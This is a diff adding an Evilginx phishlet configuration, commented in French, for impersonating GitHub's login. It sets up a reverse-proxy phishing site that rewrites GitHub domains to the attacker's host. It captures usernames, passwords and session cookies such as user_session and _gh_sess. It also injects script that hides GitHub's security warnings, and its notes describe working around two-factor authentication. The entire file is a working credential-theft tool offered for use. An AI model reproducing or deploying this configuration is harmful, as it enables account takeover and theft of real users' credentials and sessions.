@@ -1,0 +1,177 @@
+##########################################################
+# PHISHLET GITHUB - EVILGINX PRO
+# Configuration pour GitHub.com
+##########################################################
+
+name: "github"
+author: "@breakdev"
+min_ver: "3.0.0"
+
+##########################################################
+# PROXY HOSTS
+##########################################################
+proxy_hosts:
+  # Site principal GitHub
+  - phish_sub: "github"
+    orig_sub: "github"
+    domain: "com"
+    session: true
+    is_landing: true
+    auto_filter: true
+
+  # APIs GitHub
+  - phish_sub: "api"
+    orig_sub: "api"
+    domain: "github.com"
+    session: false
+    is_landing: false
+
+  # Ressources statiques
+  - phish_sub: "github"
+    orig_sub: "github"
+    domain: "githubassets.com"
+    session: false
+    is_landing: false
+
+  - phish_sub: "avatars"
+    orig_sub: "avatars"
+    domain: "githubusercontent.com"
+    session: false
+    is_landing: false
+
+##########################################################
+# SUB FILTERS
+##########################################################
+sub_filters:
+  # GitHub principal
+  - triggers_on: "github.com"
+    orig_sub: "github"
+    domain: "com"
+    search: "github.com"
+    replace: "{hostname}"
+    mimes: ["text/html", "application/json", "application/javascript"]
+
+  - triggers_on: "github.com"
+    orig_sub: "github"
+    domain: "com"
+    search: "https://github.com"
+    replace: "https://{hostname}"
+    mimes: ["text/html", "application/json"]
+
+  # GitHub Assets
+  - triggers_on: "github.com"
+    orig_sub: "github"
+    domain: "githubassets.com"
+    search: "github.githubassets.com"
+    replace: "{hostname}"
+    mimes: ["text/html", "text/css"]
+
+  # Avatars
+  - triggers_on: "github.com"
+    orig_sub: "avatars"
+    domain: "githubusercontent.com"
+    search: "avatars.githubusercontent.com"
+    replace: "{hostname}"
+    mimes: ["text/html"]
+
+##########################################################
+# AUTH TOKENS
+##########################################################
+auth_tokens:
+  # Session GitHub
+  - domain: ".github.com"
+    keys:
+      - "user_session" # Session principale
+      - "__Host-user_session_same_site" # Session secure
+      - "logged_in" # Flag de connexion
+      - "dotcom_user" # Username
+      - "_gh_sess" # Session token
+
+  # Tokens API
+  - domain: "github.com"
+    keys:
+      - "_device_id"
+      - "tz"
+
+##########################################################
+# CREDENTIALS
+##########################################################
+credentials:
+  # Username ou Email
+  username:
+    key: "login"
+    search: "(.*)"
+    type: "post"
+
+  # Mot de passe
+  password:
+    key: "password"
+    search: "(.*)"
+    type: "post"
+
+##########################################################
+# LOGIN
+##########################################################
+login:
+  domain: "github.com"
+  path: "/login"
+
+##########################################################
+# FORCE POST
+##########################################################
+force_post:
+  - path: "/session"
+    search:
+      - { key: "login", search: "(.*)" }
+      - { key: "password", search: "(.*)" }
+    force:
+      - { key: "login", value: "{login}" }
+      - { key: "password", value: "{password}" }
+      - { key: "commit", value: "Sign in" }
+      - { key: "webauthn-support", value: "supported" }
+    type: "post"
+
+##########################################################
+# JS INJECT (Pro)
+##########################################################
+js_inject:
+  - trigger_domains: ["github.com"]
+    trigger_paths: ["/login", "/session"]
+    script: |
+      // Contournement détection GitHub
+      console.log('GitHub phishing active');
+
+      // Masquer les warnings de sécurité
+      var warnings = document.querySelectorAll('.flash-error');
+      warnings.forEach(function(el) { el.style.display = 'none'; });
+
+##########################################################
+# AUTH URLS
+##########################################################
+auth_urls:
+  - "/login"
+  - "/session"
+  - "/sessions/verified-device"
+  - "/sessions/two-factor"
+  - "/sessions/two-factor/app"
+  - "/sessions/two-factor/sms"
+
+##########################################################
+# LANDING URLS
+##########################################################
+landing_urls:
+  - "/"
+  - "/dashboard"
+  - "https://github.com"
+##########################################################
+# NOTES
+##########################################################
+# GitHub utilise plusieurs méthodes d'authentification :
+# - Username/password
+# - 2FA (TOTP, SMS, Security Keys)
+# - WebAuthn
+# - SSH keys
+#
+# Ce phishlet capture les cookies de session après auth
+# Pour 2FA : nécessite Evilpuppet (Pro) ou contournement manuel
+##########################################################
